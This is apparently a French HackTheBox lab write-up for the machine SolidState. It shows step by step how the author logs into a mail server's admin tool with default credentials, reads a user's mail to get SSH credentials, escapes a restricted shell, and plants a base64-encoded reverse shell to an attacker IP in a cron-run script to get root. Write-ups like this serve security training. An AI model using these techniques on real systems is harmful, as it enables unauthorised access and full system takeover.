---
title: HTB | SolidState
description: SolidState is a medium difficulty machine that requires chaining of multiple attack vectors in order to get a privileged shell. As a note, in some cases the exploit may fail to trigger more than once and a machine reset is required.
slug: solidstate-htb
date: 2025-07-22 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Medium
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="SolidState cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">SolidState</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.10.51</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Medium</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
mindy : P@55W0rd1!2@
```

## Enumeration

### nmap

```bash
$ nmap -sC -sV -An -T4 -vvv -p- 10.10.10.51
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 770084f578b9c7d354cf712e0d526d8b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
|   256 78b83af660190691f553921d3f48ed53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE=
|   256 e445e9ed074d7369435a12709dc4af76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
25/tcp   open  smtp    syn-ack ttl 63 JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org (10.10.14.3 [10.10.14.3])
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
110/tcp  open  pop3    syn-ack ttl 63 JAMES pop3d 2.3.2
119/tcp  open  nntp    syn-ack ttl 63 JAMES nntpd (posting ok)
4555/tcp open  rsip?   syn-ack ttl 63
| fingerprint-strings: 
|   GenericLines: 
|     JAMES Remote Administration Tool 2.3.2
|     Please enter your login and password
|     Login id:
|     Password:
|     Login failed for 
|_    Login id:
```

## Foothold

### JAMES Remote Administration Tool 2.3.2 (port 5557)

On observe un service tournant sur le port 5557, demandant un user/password. En cherchant sur internet, on trouve des credentials par défaut pour cet outil :
root / root

On peut alors lister les users, et changer leur mot de passe permettant l'accès à leur boite mail. Ici, on change le mot de passe de l'utilisateur **mindy**, password : **mindy**.
```bash
telnet 10.10.10.51 4555
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password

Login id:
root

Password:
root
Welcome root. HELP for a list of commands

HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection

listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin

setpassword mindy mindy
Password for mindy reset

quit
Bye
Connection closed by foreign host.
```

### POP3 : mindy mails
En utilisant thunderbird on tente d'accéder à ses mails. Une vrai galère... (pas réussi).

Avec **telnet**, on se connecte au port 110 (POP3) avec l'utilisateur mindy. On trouve 2 emails, que l'on récupère :
```bash
telnet 10.10.10.51 110
Trying 10.10.10.51...
Connected to 10.10.10.51.
Escape character is '^]'.
USER mindy
PASS mindy
LIST
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
+OK
+OK Welcome mindy
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James

.
EXIT
-ERR
QUIT
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
```
Dans le deuxième email, on trouve des credentials en clair:
mindy : `P@55W0rd1!2@`

### SSH Connection to mindy account : user flag
On se connecte en ssh à **mindy** et on récupère le flag utilisateur **user.txt**.
```bash
$ ssh mindy@10.10.10.51
mindy@10.10.10.51's password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142

mindy@solidstate:~$ cat user.txt 
c00a.....c6b2
```

## Privilege Escalation

### mindy : restricted bash
Par défaut, on arrive dans un restricted shell. Presque aucune action n'est autorisé...
```bash
mindy@solidstate:~$ ls
bin  user.txt
mindy@solidstate:~$ cd ..
-rbash: cd: restricted
mindy@solidstate:~$ /bin/ls
-rbash: /bin/ls: restricted: cannot specify `/' in command names
```
Mais grâce à ssh, on peut préciser une commande à executer au lancement. Par exemple, lui demander de lancer un bash, ce qui permet de bypasser le lancement du restricted bash !
```bash
$ ssh mindy@10.10.10.51 bash                 
mindy@10.10.10.51's password: 
ls
bin
user.txt
cd ..
ls
james
mindy

----------------------

$ ssh mindy@10.10.10.51 -t "bash --noprofile"
mindy@10.10.10.51's password: 
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ ls
bin  user.txt
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ cd ..
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ ls
james  mindy
${debian_chroot:+($debian_chroot)}mindy@solidstate:/home$ exit
Connection to 10.10.10.51 closed.
```

### root file : /opt/tmp.py
A l'aide **linpeas** et/ou **linenum**, on découvre un fichier /opt/tmp.py qui semble vider le dossier /tmp en utilisant os.system(). Les droits du fichier sont 777 (rwxrwxrwx). Le fichier appartient à root mais est modifiable par n'importe qui, dont **mindy**. J'ai donc essayer de mettre une commande pour faire un reverse shell. Au vu de ce que fait ce script, on peut déduire qu'il doit etre executé dans une cronjob probablement en tant que root.

Après quelques minutes, je reçois bien un shell en tant que root sur la machine, ce qui prouve notre théorie :
```bash
${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py 
##!/usr/bin/env python
import os
import sys

## Reverse shell
os.system('echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi44LzkwMDEgMD4mMQ== | base64 -d | bash')

## Code initial du script
try:
     os.system('rm -r /tmp/* ')
except:
     sys.exit()


--------------------------------------------

$ nc -lnvp 9001
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::9001
Ncat: Listening on 0.0.0.0:9001
Ncat: Connection from 10.10.10.51.
Ncat: Connection from 10.10.10.51:58410.
bash: cannot set terminal process group (31712): Inappropriate ioctl for device
bash: no job control in this shell
root@solidstate:~# whoami
whoami
root
root@solidstate:~# cat /root/root.txt
cat /root/root.txt
0574.....d2b9
```

## Tips
- TOUJOURS bien regarder en détail l'execution de linpeas ou de linenum. Parfois, on peut rater des fichiers/binaires, qui ne sont pas habituels. Par exemple ici, on avait /opt/tmp.py qui aurait du me sauter aux yeux. Ces fichiers ne sont pas forcément surlignés en rouge...